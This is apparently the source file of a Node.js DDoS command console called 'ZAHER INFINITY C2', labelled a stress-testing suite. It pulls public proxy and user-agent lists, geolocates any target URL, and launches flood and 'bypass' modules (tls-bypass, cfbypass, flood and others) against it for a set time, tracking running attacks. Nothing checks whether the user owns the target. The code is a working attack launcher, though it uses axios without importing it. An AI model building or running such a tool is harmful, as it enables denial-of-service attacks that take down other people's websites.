#!/usr/bin/env node

/**
 * ZAHER INFINITY C2 - Professional Stress Testing Suite
 * Version: 6.0.0
 * Owner: ZAHER
 */

const { exec } = require('child_process');
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const path = require('path');

// [--- CONFIGURATION ---]
const version = '6.0.0';
const OWNER = 'ZAHER';
const ACCESS_KEY = 'root'; 
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// [--- UI COMPONENTS ---]
async function banner() {
  console.clear();
  console.log(`
  \x1b[38;5;27m███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
  \x1b[38;5;33m╚══███╔╝██╔══██╗██║  ██║██╔════╝██╔══██╗
  \x1b[38;5;39m  ███╔╝ ███████║███████║█████╗  ██████╔╝
  \x1b[38;5;45m ███╔╝  ██╔══██║██╔══██║██╔══╝  ██╔══██╗
  \x1b[38;5;51m███████╗██║  ██║██║  ██║███████╗██║  ██║
  \x1b[0m──────────────────────────────────────────────────────────
  \x1b[1m\x1b[37m  INFINITY C2 SYSTEM \x1b[34m[v${version}]\x1b[0m
  \x1b[1m\x1b[37m  OWNER    : \x1b[34m${OWNER}\x1b[0m
  \x1b[1m\x1b[37m  STATUS   : \x1b[32mONLINE\x1b[0m
  \x1b[1m\x1b[37m  TEAM     : \x1b[34mZAHER INFINITY OPERATIONS\x1b[0m
  \x1b[0m──────────────────────────────────────────────────────────`);
}

// [--- SCRAPER TOOLS ---]
async function scrapeAssets() {
  try {
    const prx = await axios.get('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt');
    fs.writeFileSync('proxy.txt', prx.data, 'utf-8');
    const ua = await axios.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    fs.writeFileSync('ua.txt', ua.data, 'utf-8');
  } catch (e) {
    console.log('\x1b[31m[!]\x1b[0m Failed to update proxy/UA assets.');
  }
}

function clearFiles() {
  ['proxy.txt', 'ua.txt'].forEach(f => { if (fs.existsSync(f)) fs.unlinkSync(f); });
}

// [--- CORE LOGIC ---]
async function bootup() {
  console.clear();
  console.log(`\n\x1b[34m[SYSTEM]\x1b[0m Loading ZAHER INFINITY C2 Modules...`);
  await sleep(1000);
  
  permen.question('[\x1b[1m\x1b[34mSERIAL-KEY\x1b[0m]: ', async (input) => {
    if (input.trim() === ACCESS_KEY) {
      console.log(`\x1b[32m[SUCCESS]\x1b[0m Authentication Valid.`);
      
      // Update Terminal Title
      const username = "ADMIN"; 
      process.stdout.write(`\x1b]2;[\\] VERSION ${version} ➤ User: [${username}] ➤ STATUS: [ONLINE] ➤ OWNER: [${OWNER}] ➤ MODEL: [ZAHERC2]\x07`);

      await scrapeAssets();
      await sleep(500);
      await banner();
      console.log(`Type "\x1b[34mmenu\x1b[0m" for commands.`);
      terminal();
    } else {
      console.log(`\x1b[31m[ERROR]\x1b[0m Invalid Serial Key. Access Denied.`);
      process.exit(-1);
    }
  });
}

async function handleAttack(args) {
  if (args.length < 3) {
    console.log(`\x1b[33mUsage: attack <url> <time> <method>\x1b[0m`);
    return terminal();
  }

  const [target, duration, method] = args;
  try {
    const host = new url.URL(target).hostname;
    const info = await axios.get(`http://ip-api.com/json/${host}`).catch(() => ({ data: { query: 'N/A', isp: 'N/A', as: 'N/A' } }));
    const data = info.data;

    console.clear();
    await banner();
    console.log(`
  \x1b[44m ATTACK DEPLOYED \x1b[0m
  \x1b[34m TARGET   :\x1b[0m ${target}
  \x1b[34m DURATION :\x1b[0m ${duration}s
  \x1b[34m METHOD   :\x1b[0m ${method}
  \x1b[34m IP       :\x1b[0m ${data.query}
  \x1b[34m ISP      :\x1b[0m ${data.isp}
    `);

    const methodPath = path.join(__dirname, `/lib/cache/${method}`);
    
    // Add to process list for monitor
    const attackEntry = { target, method, startTime: Date.now(), duration: parseInt(duration) };
    processList.push(attackEntry);
    
    let command;
    if (method.includes('bypass') || method === 'strike' || method === 'tornado') {
      command = `node ${methodPath} GET ${target} ${duration} 10 64 proxy.txt --full`;
    } else if (method === 'rape' || method === 'flood') {
      command = `node ${methodPath} ${duration} 10 proxy.txt 64 ${target}`;
    } else {
      command = `node ${methodPath} ${target} ${duration} 80 3 proxy.txt`;
    }
    
    exec(command, (err, stdout, stderr) => {
        if (err) {
            console.log(`\x1b[31m[!] Execution Error: ${method} failed.\x1b[0m`);
        }
    });

    // Cleanup from monitor after duration
    setTimeout(() => {
        processList = processList.filter(p => p !== attackEntry);
    }, parseInt(duration) * 1000);

  } catch (e) {
    console.log(`\x1b[31m[!]\x1b[0m Target Error: Ensure the URL includes http/https.`);
  }
  terminal();
}

// [--- COMMAND INTERFACE ---]
function terminal() {
  permen.question('\n\x1b[1m\x1b[34mZAHER@C2\x1b[0m:~$ ', (input) => {
    const [cmd, ...args] = input.trim().split(/\s+/);

    switch(cmd.toLowerCase()) {
      case 'menu':
        console.log(`
  \x1b[34m[+]\x1b[0m \x1b[1mmethods\x1b[0m  : Show attack modules
  \x1b[34m[+]\x1b[0m \x1b[1mattack\x1b[0m   : Launch attack (attack <url> <time> <method>)
  \x1b[34m[+]\x1b[0m \x1b[1mmonitor\x1b[0m  : View active processes
  \x1b[34m[+]\x1b[0m \x1b[1mclear\x1b[0m    : Clear terminal
  \x1b[34m[+]\x1b[0m \x1b[1mexit\x1b[0m     : Close session`);
        terminal();
        break;
      
      case 'methods':
        console.log(`
  \x1b[38;5;33m┏━━━━━━━━━━━━━━━━━━━ \x1b[37mZAHER INFINITY C2\x1b[38;5;33m ━━━━━━━━━━━━━━━━━━━┓\x1b[0m
  \x1b[1m\x1b[37m  [ PROXY BYPASS ] \x1b[0m
  \x1b[34m  »\x1b[0m tls-bypass    \x1b[34m»\x1b[0m night-bypass \x1b[34m»\x1b[0m cfbypass
  \x1b[34m  »\x1b[0m bypass-x      \x1b[34m»\x1b[0m uam          \x1b[34m»\x1b[0m sky-net
  
  \x1b[1m\x1b[37m  [ HIGH STRESS ] \x1b[0m
  \x1b[37m  [+]\x1b[0m strike     \x1b[37m[+]\x1b[0m thunder    \x1b[37m[+]\x1b[0m destroy
  \x1b[37m  [+]\x1b[0m storm      \x1b[37m[+]\x1b[0m inferno    \x1b[37m[+]\x1b[0m medusa
  \x1b[37m  [+]\x1b[0m killer     \x1b[37m[+]\x1b[0m xlamper    \x1b[37m[+]\x1b[0m glory
  \x1b[37m  [+]\x1b[0m mixsyn     \x1b[37m[+]\x1b[0m tpc        \x1b[37m[+]\x1b[0m lezkill
  
  \x1b[1m\x1b[37m  [ TRAFFIC & FLOOD ] \x1b[0m
  \x1b[37m  [+]\x1b[0m stev-flood \x1b[37m[+]\x1b[0m flood      \x1b[37m[+]\x1b[0m raw
  \x1b[37m  [+]\x1b[0m slim       \x1b[37m[+]\x1b[0m geckold    \x1b[37m[+]\x1b[0m stev-traffic
  
  \x1b[38;5;196m  [ VIP EXCLUSIVE ] \x1b[0m
  \x1b[38;5;208m  ★ night-flood     ★ tls-vip     ★ dragon-c2\x1b[0m
  \x1b[38;5;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\x1b[0m`);
        terminal();
        break;

      case 'attack':
        handleAttack(args);
        break;

      case 'monitor':
        console.log(`\n\x1b[34m[ ACTIVE ATTACK MONITOR ]\x1b[0m`);
        if (processList.length === 0) {
            console.log("No active attacks found.");
        } else {
            processList.forEach(p => {
                const elapsed = Math.floor((Date.now() - p.startTime) / 1000);
                const remaining = p.duration - elapsed;
                if (remaining > 0) {
                    console.log(`\x1b[32mRUNNING\x1b[0m > ${p.target} | Method: [${p.method}] | Elapsed: ${elapsed}/${p.duration}s`);
                }
            });
        }
        terminal();
        break;

      case 'clear':
        banner().then(terminal);
        break;

      case 'exit':
        console.log("Closing ZAHER INFINITY session...");
        clearFiles();
        process.exit();
        break;

      default:
        if (cmd) console.log(`\x1b[31m[!]\x1b[0m Unknown command: ${cmd}`);
        terminal();
    }
  });
}

// [--- CLEANUP ---]
process.on('exit', clearFiles);
process.on('SIGINT', () => { clearFiles(); process.exit(); });
process.on('SIGTERM', () => { clearFiles(); process.exit(); });

// [--- INITIALIZE ---]
bootup();
